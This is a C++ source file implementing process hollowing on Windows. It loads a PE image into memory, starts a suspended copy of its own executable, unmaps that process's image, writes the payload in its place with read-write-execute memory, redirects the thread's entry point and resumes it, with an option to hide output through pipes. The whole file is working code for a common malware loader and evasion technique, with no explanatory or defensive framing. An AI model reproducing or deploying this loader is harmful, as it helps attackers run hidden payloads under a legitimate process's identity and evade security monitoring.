#include <Windows.h>
#include <Winternl.h>
#include <Common.h>
#include "Config.h"


// https://msdn.microsoft.com/en-us/library/windows/desktop/ms684280(v=vs.85).aspx
typedef NTSTATUS(WINAPI* _NtQueryInformationProcess)(
	_In_      HANDLE           ProcessHandle,
	_In_      PROCESSINFOCLASS ProcessInformationClass,
	_Out_     PVOID            ProcessInformation,
	_In_      ULONG            ProcessInformationLength,
	_Out_opt_ PULONG           ReturnLength
	);

// https://msdn.microsoft.com/en-us/library/windows/hardware/ff567119(v=vs.85).aspx
typedef NTSTATUS(WINAPI* _ZwUnmapViewOfSection)(
	_In_     HANDLE ProcessHandle,
	_In_opt_ PVOID  BaseAddress
	);

/*
void ShowError(const char* lpszText)
{
	char szErr[MAX_PATH] = { 0 };
	wsprintf(szErr, "%s Error!\nError Code Is:%d\n", lpszText, GetLastError());
#ifdef _DEBUG
	MessageBox(NULL, szErr, "ERROR", MB_OK | MB_ICONERROR);
#endif
}

*/


BOOL MemMapFile(LPVOID lpData, LPVOID& lpBaseAddr, DWORD& dwSizeOfImage)
{
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpData;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((UINT64)pDosHeader + pDosHeader->e_lfanew);

	dwSizeOfImage = pNtHeaders->OptionalHeader.SizeOfImage;
	lpBaseAddr = ::VirtualAlloc(NULL, dwSizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (NULL == lpBaseAddr) {
		log("VirtualAlloc");
		return NULL;
	}
	::RtlZeroMemory(lpBaseAddr, dwSizeOfImage);


	DWORD dwSizeOfHeaders = pNtHeaders->OptionalHeader.SizeOfHeaders;
	WORD wNumberOfSections = pNtHeaders->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT64)pNtHeaders + sizeof(IMAGE_NT_HEADERS));

	::RtlCopyMemory(lpBaseAddr, lpData, dwSizeOfHeaders);

	WORD i = 0;
	LPVOID lpSrcMem = NULL;
	LPVOID lpDestMem = NULL;
	DWORD dwSizeOfRawData = 0;

	for (i = 0; i < wNumberOfSections; i++) {
		if ((0 == pSectionHeader->VirtualAddress) ||
			(0 == pSectionHeader->SizeOfRawData)) {
			pSectionHeader++;
			continue;
		}
		lpSrcMem = (LPVOID)((UINT64)lpData + (pSectionHeader->PointerToRawData));
		lpDestMem = (LPVOID)((UINT64)lpBaseAddr + pSectionHeader->VirtualAddress);
		dwSizeOfRawData = pSectionHeader->SizeOfRawData;
		::RtlCopyMemory(lpDestMem, lpSrcMem, dwSizeOfRawData);

		pSectionHeader++;
	}
	return TRUE;
}

void MakeCmdLine(char* pCmdLine, size_t sizeOfCmdLine, const char* cmdParam) {
	::RtlZeroMemory(pCmdLine, sizeOfCmdLine);
	GetModuleFileName(NULL, pCmdLine, sizeOfCmdLine);
	strcat_s(pCmdLine, sizeOfCmdLine, cmdParam);
}

BOOL MemExec(LPVOID lpData, DWORD dwLen, const char* cmdParam)
{
	LPVOID lpBaseAddr = NULL;
	DWORD dwSizeOfImage;
	if (!MemMapFile(lpData, lpBaseAddr, dwSizeOfImage)) {
		log("failed to map file");
		return FALSE;
	}

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((UINT64)pDosHeader + pDosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT64)pNtHeaders + sizeof(IMAGE_NT_HEADERS));

	STARTUPINFO startupInfo;
	::RtlZeroMemory(&startupInfo, sizeof STARTUPINFO);
	startupInfo.cb = sizeof(startupInfo);

	if (!(SHOW_STDIO)) {
		SECURITY_ATTRIBUTES saAttr = { 0 };
		saAttr.nLength = sizeof(saAttr);
		saAttr.bInheritHandle = TRUE;
		HANDLE  hStdInRead;  //child process stdin  
		HANDLE  hStdInWrite; //main process stdin  
		HANDLE  hStdOutRead;     //main process stdout  
		HANDLE  hStdOutWrite;    ///child process stdout  
		CreatePipe(&hStdInRead, &hStdInWrite, &saAttr, 0);
		CreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0);
		startupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;	
		startupInfo.hStdOutput = hStdOutWrite;     
		startupInfo.hStdError = hStdOutWrite;        
		startupInfo.hStdInput = hStdInRead;
	}
	
		

	PROCESS_INFORMATION processInfo;
	::RtlZeroMemory(&processInfo, sizeof PROCESS_INFORMATION);
	char cmdLine[1024];
	MakeCmdLine(cmdLine, 1024, cmdParam);
	if (FALSE == CreateProcess(NULL, cmdLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfo)) {
		log("failed to create process");
		return FALSE;
	}
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(processInfo.hThread, &ctx);

	HMODULE hNtDll = LoadLibrary("ntdll");
	if (!hNtDll) {
		log("failed to load ntdll");
		return FALSE;
	}
	auto fpNtQueryInformationProcess = GetProcAddress(hNtDll, "NtQueryInformationProcess");
	if (!fpNtQueryInformationProcess) {
		log("failed to locate NtQueryInformationProcess");
		return FALSE;
	}
	auto NtQueryInformationProcess = reinterpret_cast<_NtQueryInformationProcess>(fpNtQueryInformationProcess);
	auto fpZwUnmapViewOfSection = GetProcAddress(hNtDll, "ZwUnmapViewOfSection");
	if (!fpZwUnmapViewOfSection) {
		log("failed to locate NtQueryInformationProcess");
		return FALSE;
	}
	auto ZwUnmapViewOfSection = reinterpret_cast<_ZwUnmapViewOfSection>(fpZwUnmapViewOfSection);

	PROCESS_BASIC_INFORMATION processBasicInfo;
	NtQueryInformationProcess(
		processInfo.hProcess,
		ProcessBasicInformation,
		&processBasicInfo,
		sizeof(PROCESS_BASIC_INFORMATION),
		NULL
	);
	PPEB pebBaseAddr = processBasicInfo.PebBaseAddress;
	PEB peb;
	if (!ReadProcessMemory(processInfo.hProcess, pebBaseAddr, &peb, sizeof(PEB), NULL)) {
		log("failed to read peb of remote process");
		return FALSE;
	}

	LPVOID remoteImageBaseAddr = peb.Reserved3[1];

	if (0 != ZwUnmapViewOfSection(processInfo.hProcess, remoteImageBaseAddr)) {
		log(" failed to unmap remote process image");
		return FALSE;
	}
	/*
	LPVOID remoteImage = VirtualAllocEx(processInfo.hProcess, (LPVOID)(pNtHeaders->OptionalHeader.ImageBase), dwSizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (0 == remoteImage) {
		log("virtual alloc ex error !");
		return FALSE;
	}
	ULONG_PTR pebImageBaseOffset = (ULONG_PTR)processBasicInfo.PebBaseAddress + 16;
	if (!WriteProcessMemory(processInfo.hProcess, (LPVOID)pebImageBaseOffset, &remoteImage, sizeof(LPVOID), NULL)) {
		log("failed to write image base");
		return FALSE;
	}

	pNtHeaders->OptionalHeader.ImageBase = (ULONGLONG)remoteImage;
	WriteProcessMemory(processInfo.hProcess, remoteImage, lpBaseAddr, dwSizeOfImage, NULL);
	auto dwEntryPoint = (ULONG_PTR)remoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint;
	*/

	LPVOID remoteImage = VirtualAllocEx(processInfo.hProcess, remoteImageBaseAddr, dwSizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processInfo.hProcess, remoteImageBaseAddr, lpBaseAddr, dwSizeOfImage, NULL);
	auto dwEntryPoint = (ULONG_PTR)remoteImageBaseAddr + pNtHeaders->OptionalHeader.AddressOfEntryPoint;



	ctx.Rcx = dwEntryPoint;
	if (!SetThreadContext(processInfo.hThread, &ctx)) {
		log("failed to set thread context");
		return FALSE;
	}
	if (!ResumeThread(processInfo.hThread)) {
		log("failed to resume process");
		return FALSE;
	}
	CloseHandle(processInfo.hProcess);
	return TRUE;
}
